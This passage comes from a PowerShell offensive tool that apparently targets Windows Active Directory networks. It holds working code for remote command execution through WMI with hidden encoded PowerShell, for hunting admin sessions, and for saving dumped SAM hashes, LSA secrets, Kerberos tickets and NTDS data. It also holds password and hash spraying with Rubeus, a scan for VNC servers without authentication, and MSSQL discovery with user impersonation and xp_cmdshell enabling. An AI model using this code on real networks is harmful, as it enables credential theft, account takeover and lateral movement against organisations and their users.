        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    function SessionHunter {
        param($ComputerName, $Command)

        $userSIDs = @()
        $domainCache = @{}
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $adminPresent = $false

        function GetDomainFQDNFromSID {
            param($sid)
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
            $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
            if (-not $domainCache[$objDomain]) {
                try {
                    $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                    $domainCache[$objDomain] = $FQDN
                } catch {
                    return $objDomain
                }
            }
            return $domainCache[$objDomain]
        }

        try {
            $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        } catch {
            return
        }

        $userKeys = $remoteRegistry.GetSubKeyNames()

        foreach ($key in $userKeys) {
            if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                $userSIDs += $key
            }
        }

        $remoteRegistry.Close()

        foreach ($sid in $userSIDs) {
            try {
                $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                $username = $userTranslation.Value.Split('\')[1]
                
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $adminPresent = $true
                    break
                }
            } catch {}
        }

        if ($adminPresent) {
            if ($Command -eq ""){
            # We can just return as OSinfo was checked earlier in script
            return "Successful connection PME"
            
            }
            elseif ($Command -ne ""){

            return WMI $ComputerName -command $Command
            
            }
        }

    }

   SessionHunter -ComputerName $computerName -command $Command

}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = "$Computer"
    $OS = "OS:PLACEHOLDER"
    }
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            try {$result = $result.Trim()} catch {}

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
                         
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })



# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################## Function: Spray #############################################
################################################################################################################
Function Method-Spray {
Write-host

            
# Create a directory entry for the specified domain
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
$searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

# Set the filter to query the domainDNS object
$searcher.Filter = "(objectClass=domainDNS)"
$domainObject = $searcher.FindOne()

if ($domainObject.Properties.Contains("lockoutThreshold")) {
    $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
    # Check the lockout threshold value
    $LO_threshold = $lockoutThreshold

    if ($LO_threshold -eq "0") {
        $SafeLimit = 100000
    } elseif ($LO_threshold -lt 3) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Lockout threshold is 2 or less. Aborting..."
        return
    } elseif ($LO_threshold -lt 4) {
        $SafeLimit = 1
    } else {
        $SafeLimit = $LO_threshold - 2
    }
} else {
            
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Threshold not found. Aborting..."
        return
}

# gut this out and replace with the new function
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

# Display the $SafeLimit value
Write-Output " - Lockout Threshold  : $LO_threshold"
Write-Output " - Safety Limit value : $SafeLimit"
Write-Output " - Removed disabled accounts from spraying"

if ($SprayHash -ne ""){
    Write-Host
    $SprayPassword = ""
    $AccountAsPassword = $False

    if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64) {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        return
    }

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with Hash value: $SprayHash"
    Write-Host

}

if ($SprayPassword -ne ""){
    $SprayHash = ""
    $AccountAsPassword = $False

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with password value: $SprayPassword"
    Write-Host

}


if ($AccountAsPassword){
    $SprayHash = ""
    $SprayPassword = ""

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying usernames as passwords"
    Write-Host
}

if ($EmptyPassword){
    $SprayPassword = ""
    $SprayHash = ""
    $AccountAsPassword = $False     
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying empty passwords"
    Write-Host
}


foreach ($UserToSpray in $EnabledDomainUsers){
$Delay = Get-Random -Minimum 5 -Maximum 20
Start-Sleep -Milliseconds $Delay

Write-Verbose "Querying user $UserToSpray from LDAP"

try {
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
$searchResult = $searcher.FindOne()
$badPwdCount = $searchResult.Properties["badPwdCount"][0]  

            if ($badPwdCount -ge $SafeLimit){
                if (!$SuccessOnly){
                    Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Safe threshold met"
                    continue
    }
}

           # Hash Spraying
            if ($SprayHash -ne ""){
            if ($SprayHash.Length -eq 32){$Attempt = Invoke-Rubeus asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String}
            elseif ($SprayHash.Length -eq 64){$Attempt = Invoke-Rubeus asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain | Out-String}
            
            # Check for Unhandled Rubeus exception
            if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }    
            } 
            # Check for KDC_ERR_PREAUTH_FAILED
            elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED:") -ne -1) {
                if (!$SuccessOnly){
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray"
         }   
            }
            # Check for TGT request success
            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$Domain\$UserToSpray"
                "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
        }
    }

    # Password Spraying
   if ($SprayPassword -ne ""){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$SprayPassword)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # Account as password
    if ($AccountAsPassword){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$UserToSpray)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # EmptyPasswords
    if ($EmptyPassword){
    $password = ""
       
        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            }
        }
        } catch {
        
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "$Domain\$UserToSpray - Exception occurred: $($_.Exception.Message)"
        
        }
    }
}

################################################################################################################
################################################## Function: VNC ###############################################
################################################################################################################
Function Method-VNC {

if ($Port -eq ""){$Port = "5900"} else {$Port = $Port}

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($ComputerName, $Port, $Timeout)

      $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }


    if (!$connected) {$tcpClient.Close() ; return}

function VNC-NoAuth {
    param(
        [string]$ComputerName,
        [int]$Port
    )
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
    }
    catch {
        Write-Host "Error: Unable to connect to $ComputerName on port $Port"
        return "Connection Error"
    }

    try {
        $networkStream = $tcpClient.GetStream()
        $networkStream.ReadTimeout = 50
        
        # Reading Version from Server
        $buffer = New-Object byte[] 12
        $read = $networkStream.Read($buffer, 0, 12)
        if ($read -eq 0) { throw "No data received from the server" }
        $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
        # Sending Client Version
        $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
        $networkStream.Write($buffer, 0, $buffer.Length)

        # Reading Supported Security Types
        $buffer = New-Object byte[] 2
        $read = $networkStream.Read($buffer, 0, 1)
        if ($read -eq 0) { throw "No data received from the server" }
        $numberOfSecTypes = $buffer[0]
        $buffer = New-Object byte[] $numberOfSecTypes
        $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
        if ($read -eq 0) { throw "No data received from the server" }
    }
    catch {
        Write-Host "Error: Handshake failed with $ComputerName on port $Port"
        return "Handshake Error"
    }
    finally {
        # Cleanup
        if ($null -ne $networkStream) { $networkStream.Close() }
        if ($null -ne $tcpClient) { $tcpClient.Close() }
    }

    # Check for Non-authentication (Type 1)
    if ($buffer -contains 1) {
        return "Supported"
    }
    else {
        return "Not Supported"
    }
}

$AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
return "$AuthSupported"


}

# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = "$Computer"
    $OS = "OS:PLACEHOLDER"
    }
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($Timeout)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                if ($result -eq "Not Supported") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 

                if ($result -eq "Handshake Error") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 
                elseif ($result -eq "Supported") {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
            } 

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################## Function: MSSQL #############################################
################################################################################################################
Function Method-MSSQL {

Add-Type -AssemblyName "System.Data"


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($ComputerName, $MSSQL)

function Send-UdpDatagram {
    param ([string]$ComputerName)

    $client = New-Object net.sockets.udpclient(0)
    $client.Client.ReceiveTimeout = 100

    $send = [Byte] 0x03
    try {[void] $client.send($send, $send.length, $ComputerName, 1434)}
    Catch {return "Unable to connect"}

    $ipep = New-Object net.ipendpoint([net.ipaddress]::any, 0)
    $receive = $null
    try {
        $receive = $client.receive([ref]$ipep)
    } catch [System.Net.Sockets.SocketException] {return "Unable to connect"} 
    finally {
        try { $client.close() } Catch {}
    }


    $rawData = [text.encoding]::ascii.getstring($receive)
    $instanceFullNames = @()

    $rawData -split ';;' | ForEach-Object {
        if ($_ -match 'InstanceName;([^;]+)') {
            $instanceName = $matches[1]
            $instanceFullNames += "$ComputerName\$instanceName"
        }
    }

    $instanceFullNames
}

 return  Send-UdpDatagram -ComputerName $ComputerName

}

foreach ($computer in $computers) {

    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    }

    elseif ($IPAddress){
    $ComputerName = $Computer
    }

    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
    })
}

$AllInstances = @()

function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
    $searcher.PageSize = 1000
    return $searcher
}

function Get-ADSQLInstances {
    param(
        [Parameter(Mandatory=$false)]
        [string]$LDAPFilter = "(servicePrincipalName=MSSQLSvc/*)"
    )

    # Initialize an empty array to hold all instances
    $AllInstances = @()

    # Use New-Searcher function to create the DirectorySearcher object
    $ADSearcher = New-Searcher
    $ADSearcher.Filter = $LDAPFilter
    $ADSearcher.SearchScope = "Subtree"
    
    try {
        $Results = $ADSearcher.FindAll()
        foreach ($Result in $Results) {
            $Entry = $Result.GetDirectoryEntry()
            $SPNs = $Entry.servicePrincipalName
            foreach ($SPN in $SPNs) {
                if ($SPN.StartsWith("MSSQLSvc/")) {
                    $InstanceDetails = $SPN.Replace("MSSQLSvc/", "").Split(":")
                    $ComputerName = $InstanceDetails[0]
                    $InstanceName = if ($InstanceDetails.Length -gt 1) { $InstanceDetails[1] } else { "Default" }

                    # Combine ComputerName and InstanceName
                    $FullInstanceName = if ($InstanceName -eq "Default" -or $InstanceName -eq "MSSQLSERVER") { 
                        $ComputerName.ToLower() 
                    } else { 
                        "$($ComputerName.ToLower())\$InstanceName" 
                    }

                    # Add the full instance identifier to the AllInstances array
                    $AllInstances += $FullInstanceName
                }
            }
        }
    } finally {
        $ADSearcher.Dispose()
    }

    # Return the array of all instances
    return $AllInstances
}

if (!$IPAddress){$AllInstances = Get-ADSQLInstances}


# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

            if ($result -eq "Unable to connect"){continue}

            # Foreach result, store it in the AllInstances Array
            $result | foreach { $AllInstances += $_ }

            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()
$AllInstances = $AllInstances.ToUpper()
$AllInstances = $AllInstances.Trim()
$AllInstances = $AllInstances | Select -Unique | Sort-Object

$MSSQLComputers = $AllInstances | ForEach-Object {
    $computerPart = ($_ -split '\\')[0]
    if ($computerPart -like '*.*') {
        $computerPart
    } else {
        $computerPart -split '\.' | Select-Object -First 1
    }
}

$UniqueMSSQLComputers = $MSSQLComputers | Sort-Object -Unique
$FilePath = Join-Path -Path $MSSQL -ChildPath ("MSSQL-" + "All-Discovered-MSSQL-Servers" + ".txt")

# Read existing entries from the file
$ExistingEntries = @()
if (Test-Path -Path $FilePath) {
    $ExistingEntries = Get-Content -Path $FilePath
}

# Compare and append only new entries
$NewEntries = $UniqueMSSQLComputers | Where-Object { $_ -notin $ExistingEntries }
$NewEntries | Add-Content -Path $FilePath -Encoding ASCII -Force -ErrorAction "SilentlyContinue"

# Filter out instances not present in $Computers
$ComputerNames = $Computers | ForEach-Object {
    if ($_.Properties["dnshostname"]) {
        $_.Properties["dnshostname"][0].ToUpper()
    } else {
        $_.ToUpper()
    }
}
$FilteredInstances = $AllInstances | Where-Object { $ComputerNames -contains $_.Split('\')[0] }

# Assign the filtered list back to $AllInstances
$AllInstances = $FilteredInstances

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength,
        [string]$IpAddress,
        [string]$NamedInstance
    )

    # Prefix
    Write-Host "MSSQL " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    Write-Host ("{0,-16}" -f $IPAddress) -NoNewline
    
    # Display ComputerName, OS, and NamedInstance
    Write-Host ("{0,-$InstanceLength}" -f $NamedInstance) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($NamedInstance, $Username, $Password, $LocalAuth, $Domain, $Command)

try {Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}
"@ -Language CSharp}
Catch {}
function Invoke-Impersonation {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [string]$Domain,
		
        [Parameter(Mandatory=$false)]
        [switch]$RevertToSelf
    )
	
    begin {
        # Check if RevertToSelf switch is NOT provided
        if (-not $RevertToSelf) {
            # If any of the mandatory parameters are missing, throw an error
            if (-not $Username -or -not $Password -or -not $Domain) {
                Write-Output "[-] Username, Password, and Domain are mandatory unless the RevertToSelf switch is provided."
				$PSCmdlet.ThrowTerminatingError((New-Object -TypeName System.Management.Automation.ErrorRecord -ArgumentList (New-Object Exception), "ParameterError", "InvalidArgument", $null))
            }
        }
    }

    process {
        if ($RevertToSelf) {
            if ([Advapi32]::RevertToSelf()) {
               # Write-Output "[+] Successfully reverted to original user context."
            } else {
               # Write-Output "[-] Failed to revert to original user. Error: $($Error[0].Exception.Message)"
            }
            return
        }

        $tokenHandle = [IntPtr]::Zero

        # Use the LogonUser function to get a token
        $result = [Advapi32]::LogonUser(
            $Username,
            $Domain,
            $Password,
            [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS,
            [LogonProvider]::LOGON32_PROVIDER_DEFAULT,
            [ref]$tokenHandle
        )

        if (-not $result) {
            #Write-Output "[-] Failed to obtain user token. Error: $($Error[0].Exception.Message)"
            return
        }

        # Impersonate the user
        if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
            [Advapi32]::CloseHandle($tokenHandle)
            Write-Output "[-] Failed to impersonate user. Error: $($Error[0].Exception.Message)"
            return
        }
        #Write-Output "[+] Impersonation successful"
    }
}
Function Invoke-SqlQuery {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$NamedInstance,

        [Parameter(Mandatory=$true)]
        [string]$Query,

        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password
    )


    try {
        # Create and open a SQL connection
        $SqlConnection = New-Object System.Data.SqlClient.SqlConnection $ConnectionString
        $SqlConnection.Open()

        # Create a SQL command object
        $SqlCommand = $SqlConnection.CreateCommand()
        $SqlCommand.CommandText = $Query

        # Execute the query and return the results
        $Result = $SqlCommand.ExecuteReader()
        $Table = New-Object System.Data.DataTable
        $Table.Load($Result)
        $Table
    }
    catch {
        Write-Error "An error occurred: $($_.Exception.Message)"
    }
    finally {
        # Dispose SQL connection and command
        if ($SqlCommand -ne $null) {
            $SqlCommand.Dispose()
        }
        if ($SqlConnection -ne $null) {
            $SqlConnection.Dispose()
        }
    }
}
function MSSQL-Command {
    [CmdletBinding()]
    param (
    [Parameter(Mandatory=$true)]
    [string]$NamedInstance,
    
    [Parameter(Mandatory=$true)]
    [string]$Command
    )
    
    # Function to revert configurations
    function Revert-Config {
        param (
            [string]$Option,
            [int]$Value
        )
        Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure '$Option', $Value; RECONFIGURE;"
    }

    # Store the initial states
    $advancedOptionsConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options'"
    $xpCMDConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"

    # Enable 'Show Advanced Options' if needed
